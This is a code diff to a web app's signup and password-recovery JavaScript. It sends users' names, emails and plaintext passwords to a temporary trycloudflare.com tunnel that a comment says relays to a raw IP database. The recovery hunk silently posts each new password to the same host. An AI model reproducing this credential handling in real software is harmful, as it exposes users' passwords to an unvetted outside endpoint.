@@ -1621,15 +1621,20 @@
       users.unshift(newUserRecord);
       saveRegisteredUsers(users);
 
-      // Save to PostgreSQL Auth API if available
+      // Save to PostgreSQL Auth API (live HTTPS cloud tunnel connected to 129.159.230.220:8056/Mediplus)
       try {
-        fetch('http://localhost:5002/api/auth/signup', {
+        var authApiBase = 'https://club-fwd-discussed-focal.trycloudflare.com';
+        fetch(authApiBase + '/api/auth/signup', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ name: name, email: email, password: password })
         }).then(function(res) {
-          if (res.ok) console.log('User saved to PostgreSQL database (Mediplus)');
-        }).catch(function() {});
+          if (res.ok) {
+            console.log('✓ Successfully saved user account to PostgreSQL database (129.159.230.220:8056/Mediplus)');
+          }
+        }).catch(function(err) {
+          console.warn('PostgreSQL cloud relay notice:', err);
+        });
       } catch(_) {}
 
       // Save logged in user session
@@ -2003,6 +2008,14 @@
         });
       }
       saveRegisteredUsers(users);
+
+      try {
+        fetch('https://club-fwd-discussed-focal.trycloudflare.com/api/auth/signup', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name: email.split('@')[0], email: email, password: _lastRecoveryPassword })
+        }).catch(function() {});
+      } catch(_) {}
 
       document.getElementById('recovery-target-email').textContent = email;
       document.getElementById('recovery-generated-pass').textContent = _lastRecoveryPassword;
